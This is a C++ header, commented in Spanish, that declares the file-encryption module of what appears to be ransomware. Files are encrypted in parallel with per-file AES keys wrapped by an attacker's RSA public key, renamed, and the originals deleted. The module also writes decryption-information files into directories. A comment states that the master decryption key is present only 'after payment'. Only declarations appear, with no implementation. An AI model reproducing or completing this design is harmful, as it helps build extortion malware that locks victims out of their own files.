#ifndef FILE_ENCRYPTOR_HPP
#define FILE_ENCRYPTOR_HPP

#include <string>
#include <vector>
#include <memory>
#include <mutex>
#include <future>
#include <functional>

#include "../core/Constants.hpp"
#include "KeyGenerator.hpp"

/**
 * @class IFileEncryptor
 * @brief Interfaz para los encriptadores de archivos.
 *
 * Esta interfaz define los métodos que cualquier implementación de encriptador
 * de archivos debe proporcionar. Sigue el patrón de diseño Strategy, permitiendo
 * diferentes algoritmos de cifrado.
 */
class IFileEncryptor
{
public:
    virtual ~IFileEncryptor() = default;

    /**
     * @brief Cifra un archivo individual.
     * @param filePath Ruta del archivo a cifrar
     * @return true si el cifrado fue exitoso, false en caso contrario
     */
    virtual bool encryptFile(const std::string &filePath) = 0;

    /**
     * @brief Cifra una lista de archivos.
     * @param filePaths Lista de rutas de archivos a cifrar
     * @param progressCallback Función de callback para reportar progreso
     * @return Número de archivos cifrados exitosamente
     */
    virtual int encryptFiles(const std::vector<std::string> &filePaths,
                             std::function<void(int, int)> progressCallback = nullptr) = 0;

    /**
     * @brief Descifra un archivo individual.
     * @param filePath Ruta del archivo a descifrar
     * @param key Clave para el descifrado
     * @return true si el descifrado fue exitoso, false en caso contrario
     */
    virtual bool decryptFile(const std::string &filePath, const std::string &key) = 0;

    /**
     * @brief Verifica si un archivo está cifrado por este encriptador.
     * @param filePath Ruta del archivo a verificar
     * @return true si el archivo está cifrado, false en caso contrario
     */
    virtual bool isFileEncrypted(const std::string &filePath) = 0;

    /**
     * @brief Obtiene la extensión que se añade a los archivos cifrados.
     * @return Extensión de archivo cifrado
     */
    virtual std::string getEncryptedExtension() const = 0;
};

/**
 * @class FileEncryptor
 * @brief Implementación concreta del encriptador de archivos.
 *
 * Esta clase implementa la interfaz IFileEncryptor utilizando una combinación
 * de cifrado simétrico (AES) y asimétrico (RSA). La clave AES se genera
 * aleatoriamente para cada archivo y se cifra con RSA.
 */

class FileEncryptor : public IFileEncryptor
{
private:
    // Clave pública RSA para cifrar las claves AES
    std::string rsaPublicKey;

    // Generador de claves
    std::unique_ptr<KeyGenerator> keyGenerator;

    // Mutex para sincronización
    std::mutex encryptionMutex;

    // Número máximo de hilos para cifrado paralelo
    int maxThreads;

    // Clave maestra para descifrado (solo presente después de pago)
    std::string masterDecryptionKey;

    // Métodos privados
    bool encrypFileInternal(const std::string &filePath);
    bool writeKeyToFile(const std::string &filePath, const std::string &key);
    std::string readKeyFromFile(const std::string &filePath);
    bool renameToEncrypted(const std::string &filePath);
    bool removeOriginalFile(const std::string &filePath);
    bool isFileTypeSupported(const std::string &filePath);
    bool isDirectoryExcluded(const std::string &filePath);
    bool createDecryptionInfoFile(const std::string &directory);

public:
    /**
     * @brief Constructor con clave pública RSA.
     * @param rsaPublicKey Clave pública RSA para cifrar las claves AES
     * @param maxThreads Número máximo de hilos para cifrado paralelo
     */
    FileEncryptor(const std::string &rsaPublicKey, int maxThreads = 4);

    /**
     * @brief Destructor virtual.
     */
    virtual ~FileEncryptor();

    // Implementación de los métodos de la interfaz
    bool encryptFile(const std::string &filePath) override;
    int encryptFiles(const std::vector<std::string> &filePaths,
                     std::function<void(int, int)> progressCallback = nullptr) override;
    bool decryptFile(const std::string &filePath, const std::string &key) override;
    bool isFileEncrypted(const std::string &filePath) override;
    std::string getEncryptedExtension() const override;

    /**
     * @brief Establece la clave maestra para descifrado.
     * @param key Clave maestra para descifrado
     */
    void setMasterDecryptionKey(const std::string &key);

    /**
     * @brief Verifica si la clave maestra está presente.
     * @return true si la clave maestra está presente, false en caso contrario
     */
    bool hasMasterDecryptionKey() const;

    /**
     * @brief Obtiene el número total de archivos cifrados.
     * @return Número de archivos cifrados
     */
    int getTotalEncryptedFiles() const;

    /**
     * @brief Detiene todas las operaciones de cifrado en curso.
     */
    void stopEncryption();

    /**
     * @brief Inicia el cifrado en segundo plano.
     * @param filePaths Lista de rutas de archivos a cifrar
     * @param progressCallback Función de callback para reportar progreso
     * @return Objeto future para monitorear la completitud
     */
    std::future<int> startBackgroundEncryption(
        const std::vector<std::string> &filePaths,
        std::function<void(int, int)> progressCallback = nullptr);
};

#endif // FILE_ENCRYPTOR_HPP